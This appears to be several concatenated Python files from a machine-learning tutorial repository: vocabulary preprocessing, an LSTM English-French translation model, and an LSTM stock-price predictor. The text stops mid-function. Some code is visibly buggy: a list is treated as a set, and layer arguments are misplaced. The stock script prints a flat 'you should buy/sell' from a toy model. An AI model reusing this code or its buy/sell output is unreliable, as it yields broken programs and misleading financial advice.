UNK = "<unk>"
vocab = set()
add = vocab.add
# add unk 
add(UNK)

with open("data/vocab1.txt") as f:
    for line in f:
        add(line.strip())

vocab = sorted(vocab)
word2int = {w: i for i, w in enumerate(vocab)}
int2word = {i: w for i, w in enumerate(vocab)}


def update_vocab(word):
    global vocab
    global word2int
    global int2word

    vocab.add(word)
    next_int = max(int2word) + 1
    word2int[word] = next_int
    int2word[next_int] = word


def save_vocab(_vocab):
    with open("vocab1.txt", "w") as f:
        for w in sorted(_vocab):
            print(w, file=f)


def text_to_sequence(text):
    return [ word2int[word] for word in text.split() ]


def sequence_to_text(seq):
    return ' '.join([ int2word[i] for i in seq ])


def get_batches(arr, batch_size, n_steps):
    '''Create a generator that returns batches of size
       batch_size x n_steps from arr.
       
       Arguments
       ---------
       arr: Array you want to make batches from
       batch_size: Batch size, the number of sequences per batch
       n_steps: Number of sequence steps per batch
    '''
    chars_per_batch = batch_size * n_steps
    n_batches = len(arr) // chars_per_batch

    arr = arr[:chars_per_batch * n_batches]

    arr = arr.reshape((batch_size, -1))
    while True:
        for n in range(0, arr.shape[1], n_steps):
            x = arr[:, n: n+n_steps]
            y_temp = arr[:, n+1:n+n_steps+1]
            y = np.zeros(x.shape, dtype=y_temp.dtype)
            y[:, :y_temp.shape[1]] = y_temp
            yield x.reshape(1, x.shape[0], x.shape[1]), y.reshape(1, y.shape[0], y.shape[1])


def get_data(arr, n_seq, look_forward):

    n_samples = len(arr) // n_seq
    X = np.zeros((n_seq, n_samples))
    Y = np.zeros((n_seq, n_samples))

    for index, i in enumerate(range(0, n_samples*n_seq, n_seq)):
        x = arr[i:i+n_seq]
        y = arr[i+look_forward:i+n_seq+look_forward]
        if len(x) != n_seq or len(y) != n_seq:
            break
        X[:, index] = x
        Y[:, index] = y
    return X.T.reshape(1, X.shape[1], X.shape[0]), Y.T.reshape(1, Y.shape[1], Y.shape[0])


def get_text(path, files=["carroll-alice.txt", "text.txt", "text8.txt"]):
    global vocab
    global word2int
    global int2word

    text = ""
    file = files[0]
    for file in tqdm.tqdm(files, "Loading data"):
        file = os.path.join(path, file)
        with open(file, encoding="utf8") as f:
            text += f.read().lower()
    
    punc = set(punctuation)

    text = ''.join([ c for c in tqdm.tqdm(text, "Cleaning text") if c not in punc ])
    for ws in whitespace:
        text = text.replace(ws, " ")
    text = text.split()

    co = 0
    vocab_set = set(vocab)
    for i in tqdm.tqdm(range(len(text)), "Normalizing words"):
        # convert digits to words
        # (i.e '7' to 'seven')
        if text[i].isdigit():
            text[i] = p.number_to_words(text[i])
        # compare_nouns
        # compare_adjs
        # compare_verbs
        if text[i] not in vocab_set:
            text[i] = UNK
            co += 1
    # update vocab, intersection of words
    print("vocab length:", len(vocab))
    vocab = vocab_set & set(text)
    print("vocab length after update:", len(vocab))
    save_vocab(vocab)
    print("Number of unks:", co)
    return ' '.join(text)




from train import create_model, get_data, split_data, LSTM_UNITS, np, to_categorical, Tokenizer, pad_sequences, pickle


def tokenize(x, tokenizer=None):
    """Tokenize x
    :param x: List of sentences/strings to be tokenized
    :return: Tuple of (tokenized x data, tokenizer used to tokenize x)"""
    if tokenizer:
        t = tokenizer
    else:
        t = Tokenizer()
    t.fit_on_texts(x)
    return t.texts_to_sequences(x), t


def predict_sequence(enc, dec, source, n_steps, docoder_num_tokens):
    """Generate target given source sequence, this function can be used
    after the model is trained to generate a target sequence given a source sequence."""
    # encode
    state = enc.predict(source)
    # start of sequence input
    target_seq = np.zeros((1, 1, n_steps))
    # collect predictions
    output = []
    for t in range(n_steps):
        # predict next char
        yhat, h, c = dec.predict([target_seq] + state)
        # store predictions
        y = yhat[0, 0, :]

        sampled_token_index = np.argmax(y)
        output.append(sampled_token_index)
        # update state
        state = [h, c]
        # update target sequence
        target_seq = np.zeros((1, 1, n_steps))
        target_seq[0, 0] = to_categorical(sampled_token_index, num_classes=n_steps)
        
    return np.array(output)


def logits_to_text(logits, index_to_words):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    return ' '.join([index_to_words[prediction] for prediction in logits])

# load the data
X, y, X_tk, y_tk, source_sequence_length, target_sequence_length = get_data("fra.txt")

X_tk = pickle.load(open("X_tk.pickle", "rb"))
y_tk = pickle.load(open("y_tk.pickle", "rb"))

model, enc, dec = create_model(source_sequence_length, target_sequence_length, LSTM_UNITS)

model.load_weights("results/eng_fra_v1_17568.086.h5")

while True:
    text = input("> ")
    tokenized = np.array(tokenize([text], tokenizer=X_tk)[0])
    print(tokenized.shape)
    X = pad_sequences(tokenized, maxlen=source_sequence_length, padding="post")
    X = X.reshape((1, 1, X.shape[-1]))
    print(X.shape)
    # X = to_categorical(X, num_classes=len(X_tk.word_index) + 1)
    print(X.shape)
    sequence = predict_sequence(enc, dec, X, target_sequence_length, source_sequence_length)

    result = logits_to_text(sequence, y_tk.index_word)
    print(result)




from tensorflow.keras.models import Model
from tensorflow.keras.layers import Input, LSTM, GRU, Dense, Embedding, Activation, Dropout, Sequential, RepeatVector
from tensorflow.keras.layers import TimeDistributed
from tensorflow.keras.preprocessing.text import Tokenizer
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.utils import to_categorical, plot_model
from tensorflow.keras.callbacks import ModelCheckpoint, TensorBoard
import numpy as np
import matplotlib.pyplot as plt
import os
import pickle

# hyper parameters
BATCH_SIZE = 32
EPOCHS = 10
LSTM_UNITS = 128

def create_encdec_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size):
    model = Sequential()
    model.add(LSTM(LSTM_UNITS), input_shape=input_shape[1:])
    model.add(RepeatVector(output_sequence_length))
    model.add(LSTM(LSTM_UNITS), return_sequences=True)
    model.add(TimeDistributed(Dense(french_vocab_size, activation="softmax")))
    model.compile(loss="sparse_categorical_crossentropy", optimizer="adam", metrics=["categorical_accuracy"])
    return model
    

def create_model(num_encoder_tokens, num_decoder_tokens, latent_dim):
    # define an input sequence
    encoder_inputs = Input(shape=(None, num_encoder_tokens))
    encoder = LSTM(latent_dim, return_state=True)
    # define the encoder output
    encoder_outputs, state_h, state_c = encoder(encoder_inputs)
    encoder_states = [state_h, state_c]
    # encoder inference model
    encoder_model = Model(encoder_inputs, encoder_states)

    # set up the decoder now
    decoder_inputs = Input(shape=(None, num_decoder_tokens))
    decoder_lstm = LSTM(latent_dim, return_sequences=True, return_state=True)
    decoder_outputs, _, _ = decoder_lstm(decoder_inputs, initial_state=encoder_states)
    decoder_dense = Dense(num_decoder_tokens, activation="softmax")
    decoder_outputs = decoder_dense(decoder_outputs)
    # decoder inference model
    decoder_state_input_h = Input(shape=(latent_dim,))
    decoder_state_input_c = Input(shape=(latent_dim,))
    decoder_state_inputs = [decoder_state_input_h, decoder_state_input_c]

    model = Model([encoder_inputs, decoder_inputs], decoder_outputs)

    decoder_outputs, state_h, state_c = decoder_lstm(decoder_inputs, initial_state=decoder_state_inputs)
    decoder_states = [state_h, state_c]
    decoder_model = Model([decoder_inputs] + decoder_state_inputs, [decoder_outputs] + decoder_states)

    return model, encoder_model, decoder_model


def get_batches(X, y, X_tk, y_tk, source_sequence_length, target_sequence_length, batch_size=BATCH_SIZE):
    # get total number of words in X
    num_encoder_tokens = len(X_tk.word_index) + 1
    # get max number of words in all sentences in y
    num_decoder_tokens = len(y_tk.word_index) + 1

    while True:
        for j in range(0, len(X), batch_size):
            encoder_input_data = X[j: j+batch_size]
            decoder_input_data = y[j: j+batch_size]
            # redefine batch size 
            # it may differ (in last batch of dataset)
            batch_size = encoder_input_data.shape[0]

            # one-hot everything
            # decoder_target_data = np.zeros((batch_size, num_decoder_tokens, target_sequence_length), dtype=np.uint8)
            # encoder_data = np.zeros((batch_size, source_sequence_length, num_encoder_tokens), dtype=np.uint8)
            # decoder_data = np.zeros((batch_size, target_sequence_length, num_decoder_tokens), dtype=np.uint8)
            encoder_data = np.expand_dims(encoder_input_data, axis=1)
            decoder_data = np.expand_dims(decoder_input_data, axis=1)

            # for i, sequence in enumerate(decoder_input_data):
            #     for t, word_index in enumerate(sequence):
            #         # skip the first
            #         if t > 0:
            #             decoder_target_data[i, t-1, word_index] = 1
                    # decoder_data[i, t, word_index] = 1
        
            # for i, sequence in enumerate(encoder_input_data):
            #     for t, word_index in enumerate(sequence):
            #         encoder_data[i, t, word_index] = 1
                    
            yield ([encoder_data, decoder_data], decoder_input_data)

    
def get_data(file):
    X = []
    y = []
    # loading the data
    for line in open(file, encoding="utf-8"):
        if "\t" not in line:
            continue

        # split by tab
        line = line.strip().split("\t")
        input = line[0]
        output = line[1]
        output = f"{output} <eos>"
        output_sentence_input = f"<sos> {output}"
        X.append(input)
        y.append(output)

    # tokenize data
    X_tk = Tokenizer()
    X_tk.fit_on_texts(X)
    X = X_tk.texts_to_sequences(X)

    y_tk = Tokenizer()
    y_tk.fit_on_texts(y)
    y = y_tk.texts_to_sequences(y)

    # define the max sequence length for X
    source_sequence_length = max(len(x) for x in X)
    # define the max sequence length for y
    target_sequence_length = max(len(y_) for y_ in y)
    # padding sequences
    X = pad_sequences(X, maxlen=source_sequence_length, padding="post")
    y = pad_sequences(y, maxlen=target_sequence_length, padding="post")

    return X, y, X_tk, y_tk, source_sequence_length, target_sequence_length


def shuffle_data(X, y):
    """
    Shuffles X & y and preserving their pair order
    """
    state = np.random.get_state()
    np.random.shuffle(X)
    np.random.set_state(state)
    np.random.shuffle(y)
    return X, y


def split_data(X, y, train_split_rate=0.2):
    # shuffle first
    X, y = shuffle_data(X, y)
    training_samples = round(len(X) * train_split_rate)
    return X[:training_samples], y[:training_samples], X[training_samples:], y[training_samples:]
    


if __name__ == "__main__":
    # load the data
    X, y, X_tk, y_tk, source_sequence_length, target_sequence_length = get_data("fra.txt")
    # save tokenizers
    pickle.dump(X_tk, open("X_tk.pickle", "wb"))
    pickle.dump(y_tk, open("y_tk.pickle", "wb"))
    # shuffle & split data
    X_train, y_train, X_test, y_test = split_data(X, y)
    # construct the models
    model, enc, dec = create_model(source_sequence_length, target_sequence_length, LSTM_UNITS)
    plot_model(model, to_file="model.png")
    plot_model(enc, to_file="enc.png")
    plot_model(dec, to_file="dec.png")
    model.summary()

    model.compile(optimizer="adam", loss="categorical_crossentropy", metrics=["accuracy"])

    if not os.path.isdir("results"):
        os.mkdir("results")

    checkpointer = ModelCheckpoint("results/eng_fra_v1_{val_loss:.3f}.h5", save_best_only=True, verbose=2)
    # train the model
    model.fit_generator(get_batches(X_train, y_train, X_tk, y_tk, source_sequence_length, target_sequence_length),
                        validation_data=get_batches(X_test, y_test, X_tk, y_tk, source_sequence_length, target_sequence_length),
                        epochs=EPOCHS, steps_per_epoch=(len(X_train) // BATCH_SIZE),
                        validation_steps=(len(X_test) // BATCH_SIZE),
                        callbacks=[checkpointer])
    
    print("[+] Model trained.")
    model.save("results/eng_fra_v1.h5")
    print("[+] Model saved.")




from tensorflow.keras.preprocessing.text import Tokenizer
from tensorflow.keras.preprocessing.sequence import pad_sequences
from tensorflow.keras.models import Model, Sequential
from tensorflow.keras.layers import GRU, Input, Dense, TimeDistributed, Activation, RepeatVector, Bidirectional, Flatten
from tensorflow.keras.layers import Dropout, LSTM
from tensorflow.keras.optimizers import Adam
from tensorflow.keras.losses import sparse_categorical_crossentropy
import collections
import numpy as np

LSTM_UNITS = 128

def get_data(file):
    X = []
    y = []
    # loading the data
    for line in open(file, encoding="utf-8"):
        if "\t" not in line:
            continue
        # split by tab
        line = line.strip().split("\t")
        input = line[0]
        output = line[1]
        X.append(input)
        y.append(output)
    return X, y


def create_encdec_model(input_shape, output_sequence_length, english_vocab_size, french_vocab_size):
    model = Sequential()
    model.add(LSTM(LSTM_UNITS, input_shape=input_shape[1:]))
    model.add(RepeatVector(output_sequence_length))
    model.add(LSTM(LSTM_UNITS, return_sequences=True))
    model.add(TimeDistributed(Dense(french_vocab_size, activation="softmax")))
    model.compile(loss="sparse_categorical_crossentropy", optimizer="adam", metrics=["categorical_accuracy"])
    return model


def tokenize(x):
    """
    Tokenize x
    :param x: List of sentences/strings to be tokenized
    :return: Tuple of (tokenized x data, tokenizer used to tokenize x)
    """
    # TODO: Implement
    t = Tokenizer()
    t.fit_on_texts(x)
    return t.texts_to_sequences(x), t


def pad(x, length=None):
    """
    Pad x
    :param x: List of sequences.
    :param length: Length to pad the sequence to.  If None, use length of longest sequence in x.
    :return: Padded numpy array of sequences
    """
    # TODO: Implement
    sequences = pad_sequences(x, maxlen=length, padding='post')
    return sequences


def preprocess(x, y):
    """
    Preprocess x and y
    :param x: Feature List of sentences
    :param y: Label List of sentences
    :return: Tuple of (Preprocessed x, Preprocessed y, x tokenizer, y tokenizer)
    """
    preprocess_x, x_tk = tokenize(x)
    preprocess_y, y_tk = tokenize(y)

    preprocess_x = pad(preprocess_x)
    preprocess_y = pad(preprocess_y)

    # Keras's sparse_categorical_crossentropy function requires the labels to be in 3 dimensions
    preprocess_y = preprocess_y.reshape(*preprocess_y.shape, 1)

    return preprocess_x, preprocess_y, x_tk, y_tk


def logits_to_text(logits, tokenizer):
    """
    Turn logits from a neural network into text using the tokenizer
    :param logits: Logits from a neural network
    :param tokenizer: Keras Tokenizer fit on the labels
    :return: String that represents the text of the logits
    """
    index_to_words = {id: word for word, id in tokenizer.word_index.items()}
    index_to_words[0] = '<PAD>'

    return ' '.join([index_to_words[prediction] for prediction in np.argmax(logits, 1)])


if __name__ == "__main__":
    X, y = get_data("ara.txt")
    english_words = [word for sentence in X for word in sentence.split()]
    french_words = [word for sentence in y for word in sentence.split()]
    english_words_counter = collections.Counter(english_words)
    french_words_counter = collections.Counter(french_words)

    print('{} English words.'.format(len(english_words)))
    print('{} unique English words.'.format(len(english_words_counter)))
    print('10 Most common words in the English dataset:')
    print('"' + '" "'.join(list(zip(*english_words_counter.most_common(10)))[0]) + '"')
    print()
    print('{} French words.'.format(len(french_words)))
    print('{} unique French words.'.format(len(french_words_counter)))
    print('10 Most common words in the French dataset:')
    print('"' + '" "'.join(list(zip(*french_words_counter.most_common(10)))[0]) + '"')

    # Tokenize Example output
    text_sentences = [
        'The quick brown fox jumps over the lazy dog .',
        'By Jove , my quick study of lexicography won a prize .',
        'This is a short sentence .']
    text_tokenized, text_tokenizer = tokenize(text_sentences)
    print(text_tokenizer.word_index)
    print()
    for sample_i, (sent, token_sent) in enumerate(zip(text_sentences, text_tokenized)):
        print('Sequence {} in x'.format(sample_i + 1))
        print('  Input:  {}'.format(sent))
        print('  Output: {}'.format(token_sent))

    # Pad Tokenized output
    test_pad = pad(text_tokenized)
    for sample_i, (token_sent, pad_sent) in enumerate(zip(text_tokenized, test_pad)):
        print('Sequence {} in x'.format(sample_i + 1))
        print('  Input:  {}'.format(np.array(token_sent)))
        print('  Output: {}'.format(pad_sent))

    preproc_english_sentences, preproc_french_sentences, english_tokenizer, french_tokenizer =\
    preprocess(X, y)
    
    max_english_sequence_length = preproc_english_sentences.shape[1]
    max_french_sequence_length = preproc_french_sentences.shape[1]
    english_vocab_size = len(english_tokenizer.word_index)
    french_vocab_size = len(french_tokenizer.word_index)

    print('Data Preprocessed')
    print("Max English sentence length:", max_english_sequence_length)
    print("Max French sentence length:", max_french_sequence_length)
    print("English vocabulary size:", english_vocab_size)
    print("French vocabulary size:", french_vocab_size)

    tmp_x = pad(preproc_english_sentences, preproc_french_sentences.shape[1])
    tmp_x = tmp_x.reshape((-1, preproc_french_sentences.shape[-2], 1))
    print("tmp_x.shape:", tmp_x.shape)
    print("preproc_french_sentences.shape:", preproc_french_sentences.shape)

    # Train the neural network
    # increased passed index length by 1 to avoid index error
    encdec_rnn_model = create_encdec_model(
        tmp_x.shape,
        preproc_french_sentences.shape[1],
        len(english_tokenizer.word_index)+1,
        len(french_tokenizer.word_index)+1)
    print(encdec_rnn_model.summary())
    # reduced batch size
    encdec_rnn_model.fit(tmp_x, preproc_french_sentences, batch_size=256, epochs=3, validation_split=0.2)

    # Print prediction(s)
    print(logits_to_text(encdec_rnn_model.predict(tmp_x[1].reshape((1, tmp_x[1].shape[0], 1, )))[0], french_tokenizer))
    print("Original text and translation:")
    print(X[1])
    print(y[1])
    # OPTIONAL: Train and Print prediction(s)
    print("="*50)
    # Print prediction(s)
    print(logits_to_text(encdec_rnn_model.predict(tmp_x[10].reshape((1, tmp_x[1].shape[0], 1, ))[0]), french_tokenizer))
    print("Original text and translation:")
    print(X[10])
    print(y[10])
    # OPTIONAL: Train and Print prediction(s)




from tensorflow.keras.layers import LSTM, Dense, Dropout
from tensorflow.keras.callbacks import ModelCheckpoint, TensorBoard
from sklearn.metrics import mean_absolute_error, mean_squared_error, accuracy_score
import os
import time
import glob
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt

from utils import classify, shift, create_model, load_data

class PricePrediction:
    """A Class utility to train and predict price of stocks/cryptocurrencies/trades
        using keras model"""
    def __init__(self, ticker_name, **kwargs):
        """
        :param ticker_name (str): ticker name, e.g. aapl, nflx, etc.
        :param n_steps (int): sequence length used to predict, default is 60
        :param price_column (str): the name of column that contains price predicted, default is 'adjclose'
        :param feature_columns (list): a list of feature column names used to train the model, 
            default is ['adjclose', 'volume', 'open', 'high', 'low']
        :param target_column (str): target column name, default is 'future'
        :param lookup_step (int): the future lookup step to predict, default is 1 (e.g. next day)
        :param shuffle (bool): whether to shuffle the dataset, default is True
        :param verbose (int): verbosity level, default is 1
        ==========================================
        Model parameters
        :param n_layers (int): number of recurrent neural network layers, default is 3
        :param cell (keras.layers.RNN): RNN cell used to train keras model, default is LSTM
        :param units (int): number of units of cell, default is 256
        :param dropout (float): dropout rate ( from 0 to 1 ), default is 0.3
        ==========================================
        Training parameters
        :param batch_size (int): number of samples per gradient update, default is 64
        :param epochs (int): number of epochs, default is 100
        :param optimizer (str, keras.optimizers.Optimizer): optimizer used to train, default is 'adam'
        :param loss (str, function): loss function used to minimize during training,
            default is 'mae'
        :param test_size (float): test size ratio from 0 to 1, default is 0.15
        """
        self.ticker_name = ticker_name
        self.n_steps = kwargs.get("n_steps", 60)
        self.price_column = kwargs.get("price_column", 'adjclose')
        self.feature_columns = kwargs.get("feature_columns", ['adjclose', 'volume', 'open', 'high', 'low'])
        self.target_column = kwargs.get("target_column", "future")
        self.lookup_step = kwargs.get("lookup_step", 1)
        self.shuffle = kwargs.get("shuffle", True)
        self.verbose = kwargs.get("verbose", 1)

        self.n_layers = kwargs.get("n_layers", 3)
        self.cell = kwargs.get("cell", LSTM)
        self.units = kwargs.get("units", 256)
        self.dropout = kwargs.get("dropout", 0.3)

        self.batch_size = kwargs.get("batch_size", 64)
        self.epochs = kwargs.get("epochs", 100)
        self.optimizer = kwargs.get("optimizer", "adam")
        self.loss = kwargs.get("loss", "mae")
        self.test_size = kwargs.get("test_size", 0.15)

        # create unique model name
        self._update_model_name()

        # runtime attributes
        self.model_trained = False
        self.data_loaded = False
        self.model_created = False

        # test price values
        self.test_prices = None
        # predicted price values for the test set
        self.y_pred = None

        # prices converted to buy/sell classes
        self.classified_y_true = None
        # predicted prices converted to buy/sell classes
        self.classified_y_pred = None

        # most recent price
        self.last_price = None

        # make folders if does not exist
        if not os.path.isdir("results"):
            os.mkdir("results")

        if not os.path.isdir("logs"):
            os.mkdir("logs")

        if not os.path.isdir("data"):
            os.mkdir("data")

    def create_model(self):
        """Construct and compile the keras model"""
        self.model = create_model(input_length=self.n_steps,
                                    units=self.units,
                                    cell=self.cell,
                                    dropout=self.dropout,
                                    n_layers=self.n_layers,
                                    loss=self.loss,
                                    optimizer=self.optimizer)
        self.model_created = True
        if self.verbose > 0:
            print("[+] Model created")

    def train(self, override=False):
        """Train the keras model using self.checkpointer and self.tensorboard as keras callbacks.
        If model created already trained, this method will load the weights instead of training from scratch.
        Note that this method will create the model and load data if not called before."""
        
        # if model isn't created yet, create it
        if not self.model_created:
            self.create_model()

        # if data isn't loaded yet, load it
        if not self.data_loaded:
            self.load_data()

        # if the model already exists and trained, just load the weights and return
        # but if override is True, then just skip loading weights
        if not override:
            model_name = self._model_exists()
            if model_name:
                self.model.load_weights(model_name)
                self.model_trained = True
                if self.verbose > 0:
                    print("[*] Model weights loaded")
                return
        
        if not os.path.isdir("results"):
            os.mkdir("results")

        if not os.path.isdir("logs"):
            os.mkdir("logs")

        model_filename = self._get_model_filename()

        self.checkpointer = ModelCheckpoint(model_filename, save_best_only=True, verbose=1)
        self.tensorboard = TensorBoard(log_dir=f"logs\{self.model_name}")

        self.history = self.model.fit(self.X_train, self.y_train,
                        batch_size=self.batch_size,
                        epochs=self.epochs,
                        validation_data=(self.X_test, self.y_test),
                        callbacks=[self.checkpointer, self.tensorboard],
                        verbose=1)
        
        self.model_trained = True
        if self.verbose > 0:
            print("[+] Model trained")

    def predict(self, classify=False):
        """Predicts next price for the step self.lookup_step.
            when classify is True, returns 0 for sell and 1 for buy"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        # reshape to fit the model input
        last_sequence = self.last_sequence.reshape((self.last_sequence.shape[1], self.last_sequence.shape[0]))
        # expand dimension
        last_sequence = np.expand_dims(last_sequence, axis=0)
        predicted_price = self.column_scaler[self.price_column].inverse_transform(self.model.predict(last_sequence))[0][0]
        if classify:
            last_price = self.get_last_price()
            return 1 if last_price < predicted_price else 0
        else:
            return predicted_price

    def load_data(self):
        """Loads and preprocess data"""
        filename, exists = self._df_exists()
        if exists:
            # if the updated dataframe already exists in disk, load it
            self.ticker = pd.read_csv(filename)
            ticker = self.ticker
            if self.verbose > 0:
                print("[*] Dataframe loaded from disk")
        else:
            ticker = self.ticker_name

        result = load_data(ticker,n_steps=self.n_steps, lookup_step=self.lookup_step,
                            shuffle=self.shuffle, feature_columns=self.feature_columns,
                            price_column=self.price_column, test_size=self.test_size)
        
        # extract data
        self.df = result['df']
        self.X_train = result['X_train']
        self.X_test = result['X_test']
        self.y_train = result['y_train']
        self.y_test = result['y_test']
        self.column_scaler = result['column_scaler']
        self.last_sequence = result['last_sequence']      

        if self.shuffle:
            self.unshuffled_X_test = result['unshuffled_X_test']
            self.unshuffled_y_test = result['unshuffled_y_test']
        else:
            self.unshuffled_X_test = self.X_test
            self.unshuffled_y_test = self.y_test

        self.original_X_test = self.unshuffled_X_test.reshape((self.unshuffled_X_test.shape[0], self.unshuffled_X_test.shape[2], -1))
        
        self.data_loaded = True
        if self.verbose > 0:
            print("[+] Data loaded")

        # save the dataframe to disk
        self.save_data()

    def get_last_price(self):
        """Returns the last price ( i.e the most recent price )"""
        if not self.last_price:
            self.last_price = float(self.df[self.price_column].tail(1))
        return self.last_price

    def get_test_prices(self):
        """Returns test prices. Note that this function won't return the whole sequences,
        instead, it'll return only the last value of each sequence"""
        if self.test_prices is None:
            current = np.squeeze(self.column_scaler[self.price_column].inverse_transform([[ v[-1][0] for v in self.original_X_test ]]))
            future = np.squeeze(self.column_scaler[self.price_column].inverse_transform(np.expand_dims(self.unshuffled_y_test, axis=0)))
            self.test_prices = np.array(list(current) + [future[-1]])
        return self.test_prices

    def get_y_pred(self):
        """Get predicted values of the testing set of sequences ( y_pred )"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        if self.y_pred is None:
            self.y_pred = np.squeeze(self.column_scaler[self.price_column].inverse_transform(self.model.predict(self.unshuffled_X_test)))
        return self.y_pred

    def get_y_true(self):
        """Returns original y testing values ( y_true )"""
        test_prices = self.get_test_prices()
        return test_prices[1:]

    def _get_shifted_y_true(self):
        """Returns original y testing values shifted by -1.
        This function is useful for converting to a classification problem"""
        test_prices = self.get_test_prices()
        return test_prices[:-1]

    def _calc_classified_prices(self):
        """Convert regression predictions to a classification predictions ( buy or sell )
        and set results to self.classified_y_pred for predictions and self.classified_y_true 
        for true prices"""
        if self.classified_y_true is None or self.classified_y_pred is None:
            current_prices = self._get_shifted_y_true()
            future_prices = self.get_y_true()
            predicted_prices = self.get_y_pred()
            self.classified_y_true = list(map(classify, current_prices, future_prices))
            self.classified_y_pred = list(map(classify, current_prices, predicted_prices))
        
    # some metrics

    def get_MAE(self):
        """Calculates the Mean-Absolute-Error metric of the test set"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        y_true = self.get_y_true()
        y_pred = self.get_y_pred()
        return mean_absolute_error(y_true, y_pred)

    def get_MSE(self):
        """Calculates the Mean-Squared-Error metric of the test set"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        y_true = self.get_y_true()
        y_pred = self.get_y_pred()
        return mean_squared_error(y_true, y_pred)

    def get_accuracy(self):
        """Calculates the accuracy after adding classification approach (buy/sell)"""
        if not self.model_trained:
            raise RuntimeError("Model is not trained yet, call model.train() first.")
        self._calc_classified_prices()
        return accuracy_score(self.classified_y_true, self.classified_y_pred)

    def plot_test_set(self):
        """Plots test data"""
        future_prices = self.get_y_true()
        predicted_prices = self.get_y_pred()
        plt.plot(future_prices, c='b')
        plt.plot(predicted_prices, c='r')
        plt.xlabel("Days")
        plt.ylabel("Price")
        plt.legend(["Actual Price", "Predicted Price"])
        plt.show()

    def save_data(self):
        """Saves the updated dataframe if it does not exist"""
        filename, exists = self._df_exists()
        if not exists:
            self.df.to_csv(filename)
            if self.verbose > 0:
                print("[+] Dataframe saved")

    def _update_model_name(self):
        stock = self.ticker_name.replace(" ", "_")
        feature_columns_str = ''.join([ c[0] for c in self.feature_columns ])
        time_now = time.strftime("%Y-%m-%d")
        self.model_name = f"{time_now}_{stock}-{feature_columns_str}-loss-{self.loss}-{self.cell.__name__}-seq-{self.n_steps}-step-{self.lookup_step}-layers-{self.n_layers}-units-{self.units}"

    def _get_df_name(self):
        """Returns the updated dataframe name"""
        time_now = time.strftime("%Y-%m-%d")
        return f"data/{self.ticker_name}_{time_now}.csv"

    def _df_exists(self):
        """Check if the updated dataframe exists in disk, returns a tuple contains (filename, file_exists)"""
        filename = self._get_df_name()
        return filename, os.path.isfile(filename)

    def _get_model_filename(self):
        """Returns the relative path of this model name with h5 extension"""
        return f"results/{self.model_name}.h5"

    def _model_exists(self):
        """Checks if model already exists in disk, returns the filename,
        returns None otherwise"""
        filename = self._get_model_filename()
        return filename if os.path.isfile(filename) else None




# uncomment below to use CPU instead of GPU
# import os
# os.environ["CUDA_DEVICE_ORDER"] = "PCI_BUS_ID"   # see issue #152
# os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

# import tensorflow as tf

# config = tf.ConfigProto(intra_op_parallelism_threads=4,
#                         inter_op_parallelism_threads=4, 
#                         allow_soft_placement=True,
#                         device_count = {'CPU' : 1,
#                                         'GPU' : 0}
#                        )

from tensorflow.keras.layers import GRU, LSTM
from price_prediction import PricePrediction

ticker = "AAPL"

p = PricePrediction(ticker, feature_columns=['adjclose', 'volume', 'open', 'high', 'low'],
                    epochs=700, cell=LSTM, optimizer="rmsprop", n_layers=3, units=256, 
                    loss="mse", shuffle=True, dropout=0.4)
p.train(True)
print(f"The next predicted price for {ticker} is {p.predict()}")
buy_sell = p.predict(classify=True)
print(f"you should {'sell' if buy_sell == 0 else 'buy'}.")

print("Mean Absolute Error:", p.get_MAE())
print("Mean Squared Error:", p.get_MSE())
print(f"Accuracy: {p.get_accuracy()*100:.3f}%")

p.plot_test_set()




from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import LSTM, Dense, Dropout
from sklearn import preprocessing
from yahoo_fin import stock_info as si
from collections import deque

import pandas as pd
import numpy as np
import random

def create_model(input_length, units=256, cell=LSTM, n_layers=2, dropout=0.3, loss="mean_absolute_error", optimizer="rmsprop"):
    model = Sequential()
    for i in range(n_layers):
        if i == 0:
            # first layer
            model.add(cell(units, return_sequences=True, input_shape=(None, input_length)))
            model.add(Dropout(dropout))
        elif i == n_layers -1:
            # last layer
            model.add(cell(units, return_sequences=False))
            model.add(Dropout(dropout))
        else:
            # middle layers
            model.add(cell(units, return_sequences=True))
            model.add(Dropout(dropout))
    
    model.add(Dense(1, activation="linear"))
    model.compile(loss=loss, metrics=["mean_absolute_error"], optimizer=optimizer)
        
    return model


def load_data(ticker, n_steps=60, scale=True, split=True, balance=False, shuffle=True,
                lookup_step=1, test_size=0.15, price_column='Price', feature_columns=['Price'],
                target_column="future", buy_sell=False):
    """Loads data from yahoo finance, if the ticker is a pd Dataframe,
    it'll use it instead"""
    if isinstance(ticker, str):
        df = si.get_data(ticker)
    elif isinstance(ticker, pd.DataFrame):
        df = ticker
    else:
        raise TypeError("ticker can be either a str, or a pd.DataFrame instance")

    result = {}

    result['df'] = df.copy()
    # make sure that columns passed is in the dataframe
    for col in feature_columns:
        assert col in df.columns
    
    column_scaler = {}
    if scale:
        # scale the data ( from 0 to 1 )
        for column in feature_columns:
            scaler = preprocessing.MinMaxScaler()
            df[column] = scaler.fit_transform(np.expand_dims(df[column].values, axis=1))
            column_scaler[column] = scaler
        # df[column] = preprocessing.scale(df[column].values)

    # add column scaler to the result
    result['column_scaler'] = column_scaler

    # add future price column ( shift by -1 )
    df[target_column] = df[price_column].shift(-lookup_step)

    # get last feature elements ( to add them to the last sequence )
    # before deleted by df.dropna
    last_feature_element = np.array(df[feature_columns].tail(1))

    # clean NaN entries
    df.dropna(inplace=True)

    if buy_sell:
        # convert target column to 0 (for sell -down- ) and to 1 ( for buy -up-)
        df[target_column] = list(map(classify, df[price_column], df[target_column]))

    seq_data = [] # all sequences here
    # sequences are made with deque, which keeps the maximum length by popping out older values as new ones come in
    sequences = deque(maxlen=n_steps)

    for entry, target in zip(df[feature_columns].values, df[target_column].values):
        sequences.append(entry)
        if len(sequences) == n_steps:
            seq_data.append([np.array(sequences), target])

    # get the last sequence for future predictions
    last_sequence = np.array(sequences)
    # shift the sequence, one element is missing ( deleted by dropna )
